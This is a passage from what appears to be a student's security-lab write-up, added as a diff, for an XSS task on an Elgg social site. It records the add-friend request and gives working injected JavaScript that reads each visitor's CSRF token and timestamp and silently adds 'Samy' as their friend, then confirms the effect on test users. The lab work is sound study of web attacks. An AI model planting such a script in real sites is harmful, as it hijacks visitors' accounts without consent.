@@ -38,6 +38,58 @@ As you can see, the browser sent the GET request, and it got to our server.
 
 ### Task 4
 
+Our objective is to create and inject a piece of javascript code onto the website that will add Samy as a friend to anyone that loads Alice's profile. <br>
+In order to do so, we need to know the request's structure. <br>
+We achieved this by logging into Boby's account and adding Samy as a friend, all while having the Firefox's dev tools open recording all the HTTP requests sent. 
+
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049749147097497670/image.png">
+
+Now that we know what action is invoked and what arguments are passed, we can create the script we'll be injecting in Alice's account description. <br>
+The request receives as arguments some sort of user identifier passed in the "friend" field, in Samy's case it's 59, and two Elgg fields: __elgg_ts and __elgg_token. <br>
+With this in mind, using the given code, we can easily build our script and place it into Alice's description.
+
+```js
+<script type="text/javascript">
+        window.onload = function () {
+                var Ajax=null;
+                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // ➀
+                var token="&__elgg_token="+elgg.security.token.__elgg_token; // ➁
+
+                //Construct the HTTP request to add Samy as a friend.
+                var friend="friend=59"; //Samy's friend "code"
+                
+                var sendurl="http://www.seed-server.com/action/friends/add?"+friend+ts+token+ts+token; 
+
+                //Create and send Ajax request to add friend
+                Ajax=new XMLHttpRequest();
+                Ajax.open("GET", sendurl, true);
+                Ajax.send();
+        }
+</script>
+```
+
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751088439509072/image.png">
+
+- Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?
+    - R: The purpose of the lines is to retrieve the information needed for the __elgg_ts and __elgg_token fields from the user's security token, which is unique. This was we can generalize the attack to work on any user that loads the vulnerable page.
+- Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?
+    - R: Yes. Despite Editor mode adding aditional HTML code to our code, rendering the way we're using to inject our worm onto the website useless, we could still use a different method, like the one explained earlier in this lab's tutorial. Assuming the other fields are still present, like the Brief Description field, we could insert a small script tag that redirects to our worm code, in another server.
+
+We know that, before placing our code in Alice's profile, Alice is not friends with Samy.
+
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751572764172389/image.png">
+
+This changes after reloading the page, confirming that our worm is successful in it's job.
+
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751331855933451/image.png">
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751476592988240/image.png">
+
+Just to make sure, we tested this with an unsuspecting victim, Charlie.
+
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751788795985942/image.png">
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751987354357771/image.png">
+<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049752115351928962/image.png">
+
 ## Week 10 CTF Challenge
 ### Challenge 1
 
